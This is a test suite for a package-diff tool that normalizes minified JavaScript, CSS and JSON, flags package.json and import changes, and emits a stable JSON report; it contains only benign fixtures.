      "module.exports=function(n,t){" +
      Array.from({ length: 40 }, (_, i) => `n.p${i}=t+${i};`).join("") +
      "return n};\n";
    const banner = "/*! lib 1.0 | MIT */\n";
    const files = byFile(
      (
        await pretty({
          "a/keep.txt": "x\n",
          "b/keep.txt": "x\n",
          "a/strict.min.js": `"use strict";` + long,
          "b/strict.min.js": long,
          "a/strict-inside.min.js": long.replace("{", `{"use strict";`),
          "b/strict-inside.min.js": long,
          "a/strict-paren.min.js": `"use strict";` + long,
          "b/strict-paren.min.js": `("use strict");` + long,
          "b/new-bin.min.js": "#!/bin/sh\n" + long,
          "b/new-strict.min.js": `"use strict";` + long,
          "b/new-pure.min.js": banner + `/* @__PURE__ */ String()||run("a");` + long,
          "b/new-pure-two.min.js": banner + `/*#__PURE__*/String()||run("a"),/*#__PURE__*/String()||run("b");` + long,
        })
      ).text,
    );
    expect(files["strict.min.js"]).toEqual([`- "use strict";`]);
    expect(files["strict-inside.min.js"]).toEqual([`-   "use strict";`]);
    expect(files["strict-paren.min.js"].map(line => line.slice(0, 2))).toEqual(["- ", "+ "]);
    expect(files["new-bin.min.js"][0]).toBe("+ #!/bin/sh");
    expect(files["new-strict.min.js"][0]).toBe(`+ "use strict";`);
    expect(files["new-pure.min.js"].slice(0, 2)).toEqual(["+ /*! lib 1.0 | MIT */", `+ String() || run("a");`]);
    expect(files["new-pure-two.min.js"].slice(0, 3)).toEqual([
      "+ /*! lib 1.0 | MIT */",
      `+ String() || run("a");`,
      `+ String() || run("b");`,
    ]);
  });

  test("a file that awaits at the top level is parsed like any other", async () => {
    const { text, exitCode } = await pretty({
      "a/t.mjs": `export const v = 1;\n`,
      "b/t.mjs": `const cp = await import("node:child_process");\nexport const v = 1;\n`,
    });
    expect(text).not.toContain("not parsed");
    expect(text).toContain("now imports node:child_process");
    expect(exitCode).toBe(0);
  });

  test("minified: banner, renamed locals and spelling all compose onto the un-minified display", async () => {
    // Different banner, different mangled names, `!0` vs `true`, plus exactly one real edit.
    const body = (a: string, b: string, t: string, edit: string) =>
      `function ${a}(${b}){return ${b}?${t}:${edit}}function ${b}2(${a}){for(var i=0;i<${a}.length;i++)${a}[i]=${a}[i]+1;return ${a}}module.exports={f:${a},g:${b}2};`;
    const pad = "/*" + Buffer.alloc(300, "x").toString() + "*/";
    const va = "/*! lib v1 */\n" + pad + body("a", "b", "!0", "null");
    const vb = "/*! lib v2 */\n" + pad + body("q", "r", "true", "void 0");
    const { text, exitCode } = await pretty({ "a/x.min.js": va, "b/x.min.js": vb });
    // `!0`/`true` folds but each side keeps its own spelling; `null` → `void 0` is the one real change.
    expect(changed(text)).toStrictEqual([
      "- /*! lib v1 */",
      "+ /*! lib v2 */",
      "-   return a1 ? !0 : null;",
      "+   return a1 ? true : void 0;",
    ]);
    // Every shown line is addressed to the original: line 2 (the code line) for code, line 1 for the banner.
    expect(text).toMatch(/\n +1:1 │- \/\*! lib v1 \*\/\n/);
    expect(text).toMatch(/\n +2:\d+ │-   return a1 \? !0 : null;\n/);
    expect(exitCode).toBe(0);
  });

  test("CSS and JSON: a real change shows, unparsable input falls back to text with a 'not parsed' badge", async () => {
    const { text, exitCode } = await pretty({
      "a/s.css": ".a{color:red}\n.b{margin:0}\n",
      "b/s.css": ".a { color: blue }\n.b { margin: 0 }\n",
      "a/bad.css": ".a{color:red}\n",
      "b/bad.css": ".a{color:red\n.b{{{\n",
      "a/d.json": '{"a":1,"b":[1,2]}\n',
      "b/d.json": '{\n  "a": 2,\n  "b": [1, 2]\n}\n',
      "a/bad.json": '{"a":1}\n',
      "b/bad.json": '{"a":1,,}\n',
    });
    // Formatting is not a change; the values are — shown on the canonical print, since CSS/JSON have no source map.
    expect(text).toMatch(/\ns\.css ─+ normalized \+1 -1\n/);
    expect(text).toContain("│-   color: red;");
    expect(text).toContain("│+   color: #00f;");
    expect(text).not.toContain("margin");
    expect(text).toMatch(/\nd\.json ─+ normalized \+1 -1\n/);
    expect(text).toContain('│+   "a": 2,');
    expect(text).not.toMatch(/│[-+].*"b"/);
    expect(text).toMatch(/\nbad\.css ─+ not parsed \+2 -1\n/);
    expect(text).toMatch(/\nbad\.json ─+ not parsed \+1 -1\n/);
    expect(exitCode).toBe(0);
  });

  test("a style sheet with url() is compared by its canonical print too", async () => {
    const { text, exitCode } = await pretty({
      "a/same.css": `.a{background:url(a.png)}@font-face{font-family:x;src:url("x.woff2")}`,
      "b/same.css": `.a {\n  background: url(a.png);\n}\n@font-face {\n  font-family: x;\n  src: url("x.woff2");\n}\n`,
      "a/moved.css": `.a{margin:0}.b{background:url(a.png)}`,
      "b/moved.css": `.a { margin: 0 }\n.b { background: url(https://example.com/b.png) }\n`,
    });
    expect(text).toMatch(/\nsame\.css ─+ formatting only\n/);
    expect(text).toMatch(/\nmoved\.css ─+ normalized \+1 -1\n/);
    expect(changed(text)).toEqual([
      '-   background: url("a.png");',
      '+   background: url("https://example.com/b.png");',
    ]);
    expect(exitCode).toBe(0);
  });

  // A debug build byte-scans the 64 MB line slowly (~30 s); release is well under a second.
  test.skipIf(isDebug)(
    "a file over the normalization size limit is diffed as text and says so",
    async () => {
      // One long line, so the text diff over it is cheap and only the size check is exercised.
      const big = "export const v = 1; /*" + Buffer.alloc(64 * 1024 * 1024, "x").toString() + "*/\n";
      const { text, exitCode } = await pretty({ "a/big.js": big, "b/big.js": big.replace("v = 1", "v = 2") });
      expect(text).toMatch(/\nbig\.js ─+ too large to normalize \+1 -1\n/);
      expect(text).toContain("│- export const v = 1;");
      expect(exitCode).toBe(0);
    },
    60_000,
  );

  test("hostile shapes do not crash: 300-deep nesting, a 20k-term comma chain, an empty file each side", async () => {
    const deep = "export const f = " + Buffer.alloc(300 * 6, "() => ").toString() + "1;\n";
    const chain =
      "var s = " +
      Array.from({ length: 20000 }, (_, i) => `a${i}`).join(" + ") +
      ";\nf()" +
      Buffer.alloc(20000 * 4, ",g()").toString() +
      ";\n";
    const { text, exitCode } = await pretty({
      "a/deep.js": deep,
      "b/deep.js": deep.replace("1;", "2;"),
      "a/chain.min.js": chain,
      "b/chain.min.js": chain.replace(",g();", ",g(),h();"),
      "a/empty.js": "",
      "b/empty.js": "",
    });
    expect(text).toMatch(/\ndeep\.js ─+ unminified \+1 -1\n/);
    expect(text).toContain("│+ h();");
    expect(text).not.toContain("empty.js");
    expect(exitCode).toBe(0);
  }, 30_000);

  test("un-minified display: a bare `if(x)a(),b()` body splits like a block one; minified CSS/JSON keep plain gutters", async () => {
    const pad = "/*" + Buffer.alloc(300, "x").toString() + "*/";
    // The edit sits inside the `if` so the split body is in the shown context (`f` is renamed in lockstep to `a_`).
    const js = (t: string) => pad + `function f(x){if(x)a(),b(),c(${t});else d(),e()}f(1);`;
    const { text, exitCode } = await pretty({
      "a/m.min.js": js("1"),
      "b/m.min.js": js("2"),
      "a/s.min.css": pad + ".a{color:red}.b{margin:0}.c{padding:0}",
      "b/s.min.css": pad + ".a{color:blue}.b{margin:0}.c{padding:0}",
    });
    expect(text).toContain("│    if (a1) {\n");
    expect(text).toContain("│      a();\n");
    expect(text).toContain("│      b();\n");
    expect(text).toContain("│-     c(1);\n");
    expect(text).toContain("│+     c(2);\n");
    expect(text).toContain("│    } else {\n");
    expect(text).toContain("│      d();\n");
    expect(text).not.toMatch(/0:0 │/);
    expect(text).toMatch(/\n +\d+ │-   color: red;\n/);
    expect(exitCode).toBe(0);
  });

  test("a folder with a package.json is read as `bun pm pack` would publish it: files, .npmignore, bins", async () => {
    const pkg = (v: string) =>
      JSON.stringify({ name: "p", version: v, files: ["lib", "cli.js"], bin: { p: "cli.js" } });
    const { text, exitCode } = await pretty({
      "a/package.json": pkg("1.0.0"),
      "a/lib/index.js": "module.exports = 1;\n",
      "a/lib/scratch.log": "old log\n",
      "a/lib/.npmignore": "*.log\n",
      "a/test/index.test.js": "test('x', () => {});\n",
      "a/node_modules/dep/index.js": "dep\n",
      "a/vendor/huge.bin": Buffer.alloc(64, 1),
      "b/package.json": pkg("1.0.1"),
      "b/lib/index.js": "module.exports = 2;\n",
      "b/lib/scratch.log": "new log\n",
      "b/lib/.npmignore": "*.log\n",
      "b/test/index.test.js": "test('y', () => {});\n",
      "b/cli.js": "#!/usr/bin/env node\n",
      "b/vendor/huge.bin": Buffer.alloc(64, 2),
    });
    // A malformed `files` (pack would refuse it) just means the folder is read whole.
    const odd = await pretty({
      "a/package.json": JSON.stringify({ name: "p", version: "1.0.0", files: "lib" }),
      "a/lib/index.js": "1\n",
      "a/other.txt": "x\n",
      "b/package.json": JSON.stringify({ name: "p", version: "1.0.1", files: "lib" }),
      "b/lib/index.js": "1\n",
      "b/other.txt": "y\n",
    });
    expect(odd.text).toContain("other.txt");
    expect(odd.exitCode).toBe(0);
    // Only what would ship: package.json, lib/index.js (and the bin, which appears in b).
    const headers = text
      .split("\n")
      .filter(l => /^\S.* ─+ /.test(l))
      .map(l => l.split(" ─")[0]);
    expect(headers).toStrictEqual(["cli.js", "lib/index.js", "package.json"]);
    expect(text).not.toContain("scratch.log");
    expect(text).not.toContain("index.test.js");
    expect(text).not.toContain("vendor/");
    expect(exitCode).toBe(0);
  });

  test("package.json callouts: main, bin, exports, engines, license, types — changed, added, removed", async () => {
    const { text, exitCode } = await pretty({
      "a/package.json": JSON.stringify({
        name: "p",
        version: "1.0.0",
        main: "index.js",
        types: "index.d.ts",
        license: "MIT",
        engines: { node: ">=14" },
      }),
      "b/package.json": JSON.stringify({
        name: "p",
        version: "1.0.1",
        main: "dist/index.js",
        bin: { p: "cli.js" },
        exports: { ".": "./dist/index.js" },
        license: "SSPL-1.0",
        engines: { node: ">=18" },
      }),
    });
    const notes = text.split("\n").filter(l => /^ {2}[▲!] /.test(l));
    expect(notes).toStrictEqual([
      "  ▲ main changed: index.js → dist/index.js",
      "  ▲ types removed",
      '  ▲ bin added: { "p": "cli.js" }',
      '  ▲ exports added: { ".": "./dist/index.js" }',
      '  ▲ engines changed: { "node": ">=14" } → { "node": ">=18" }',
      "  ▲ license changed: MIT → SSPL-1.0",
    ]);
    expect(exitCode).toBe(0);
  });

  test("--json is one stable document", async () => {
    const { raw, exitCode } = await pretty(
      {
        "a/package.json": '{"name":"p","version":"1.0.0"}',
        "b/package.json": '{\n  "name": "p",\n  "version": "1.0.0"\n}\n',
        "a/index.js": "module.exports = 1;\n",
        "b/index.js": "module.exports = 2;\n",
        "b/new.txt": "hi\n",
      },
      ["--json"],
    );
    expect(JSON.parse(raw)).toMatchInlineSnapshot(`
      {
        "files": [
          {
            "binary": false,
            "bytesAfter": 20,
            "bytesBefore": 20,
            "formattingOnly": false,
            "linesAdded": 1,
            "linesRemoved": 1,
            "patch": 
      "@@ -1,1 +1,1 @@
      -module.exports = 1;
      +module.exports = 2;
      "
      ,
            "path": "index.js",
            "sourceMap": false,
            "status": "modified",
          },
          {
            "binary": false,
            "bytesAfter": 3,
            "bytesBefore": 0,
            "formattingOnly": false,
            "linesAdded": 1,
            "linesRemoved": 0,
            "patch": 
      "@@ -0,0 +1,1 @@
      +hi
      "
      ,
            "path": "new.txt",
            "sourceMap": false,
            "status": "added",
          },
          {
            "binary": false,
            "bytesAfter": 40,
            "bytesBefore": 30,
            "formattingOnly": true,
            "linesAdded": 4,
            "linesRemoved": 1,
            "patch": 
      "@@ -1,1 +1,4 @@
      -{"name":"p","version":"1.0.0"}
      \\ No newline at end of file
      +{
      +  "name": "p",
      +  "version": "1.0.0"
      +}
      "
      ,
            "path": "package.json",
            "sourceMap": false,
            "status": "modified",
          },
        ],
        "from": "./a",
        "notes": [],
        "to": "./b",
        "totals": {
          "added": 1,
          "deleted": 0,
          "files": 3,
          "formattingOnly": 1,
          "linesAdded": 6,
          "linesRemoved": 2,
        },
      }
    `);
    expect(exitCode).toBe(0);
  });
});
